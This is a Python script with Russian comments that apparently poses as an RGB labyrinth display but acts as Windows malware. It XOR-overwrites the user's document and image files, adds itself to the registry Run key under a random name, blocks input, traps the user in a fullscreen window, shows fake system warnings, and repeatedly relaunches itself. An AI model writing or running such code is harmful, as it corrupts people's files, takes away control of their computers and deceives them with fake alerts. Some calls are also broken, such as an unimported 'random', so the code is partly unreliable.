import pygame
import numpy as np
import win32api
import win32con
import threading
import time
import sys
import os
import ctypes
from cryptography.fernet import Fernet

# Полиморфный движок
def morph_code():
    return Fernet.generate_key().decode()[:8]

# Псевдо-шифрование файлов (обратимое)
def file_shadowing():
    user_dir = os.path.expanduser('~')
    for root, _, files in os.walk(os.path.join(user_dir, 'Documents')):
        for file in files:
            if file.endswith(('.txt', '.docx', '.jpg')):
                path = os.path.join(root, file)
                with open(path, 'rb+') as f:
                    data = f.read()
                    f.seek(0)
                    f.write(bytes([b ^ 0x55 for b in data]))

# Анти-отладка
def anti_debug():
    while True:
        time.sleep(30)
        if ctypes.windll.kernel32.IsDebuggerPresent():
            win32api.MessageBox(0, "Отладка обнаружена!", "SYSTEM ALERT", 0x10)
            os.startfile(__file__)

# 3D RGB-лабиринт
def rgb_labyrinth():
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    clock = pygame.time.Clock()
    size = np.array(screen.get_size())
    
    vertices = []
    for _ in range(50):
        vertices.append(np.random.rand(3) * size)
    
    while True:
        for event in pygame.event.get():
            if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                win32api.MessageBox(0, "Выход заблокирован!", "ERROR", 0x10)
        
        screen.fill((0, 0, 0))
        
        # Динамическая сетка
        for i in range(0, size[0], 30):
            pygame.draw.line(screen, 
                            (np.sin(time.time())*127+128, 
                             np.cos(time.time())*127+128, 
                             np.abs(np.tan(time.time()))*127), 
                            (i, 0), (i, size[1]))
        
        # Плавающие объекты
        for v in vertices:
            pygame.draw.circle(screen, 
                              (random.randint(0,255), 
                               random.randint(0,255), 
                               random.randint(0,255)), 
                              (int(v[0]), int(v[1])), 
                              int(20 + 15*np.sin(time.time())))
            v[:2] += np.random.uniform(-5, 5, 2)
            v[:2] = np.clip(v[:2], 0, size)
        
        pygame.display.flip()
        clock.tick(30)

# Ядро блокировок
def system_lock():
    # Инверсия управления
    threading.Thread(target=lambda: [
        win32api.SystemParametersInfo(win32con.SPI_SETMOUSE, 0, [0, 1][::random.choice([1,-1])], 0),
        time.sleep(random.uniform(0.5, 2))
    ]).start()
    
    # Случайные диалоги
    threading.Thread(target=lambda: [
        win32api.MessageBox(0, random.choice([
            "Доступ к системе ограничен", 
            "Требуется верификация RGB", 
            "Нейросеть заблокировала ваш ввод"
        ]), "WARNING", 0x30),
        time.sleep(random.randint(10, 60))
    ]).start()

# Стелс-автозагрузка
def set_autostart():
    import winreg
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, morph_code(), 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
        winreg.CloseKey(key)
    except: pass

if __name__ == "__main__":
    ctypes.windll.user32.BlockInput(True)  # Временная блокировка ввода
    set_autostart()
    threading.Thread(target=file_shadowing, daemon=True).start()
    threading.Thread(target=anti_debug, daemon=True).start()
    threading.Thread(target=rgb_labyrinth, daemon=True).start()
    threading.Thread(target=system_lock, daemon=True).start()
    
    # Мультипроцессорная защита
    for _ in range(5):
        os.startfile(__file__)
    
    ctypes.windll.user32.BlockInput(False)
    while True: time.sleep(3600)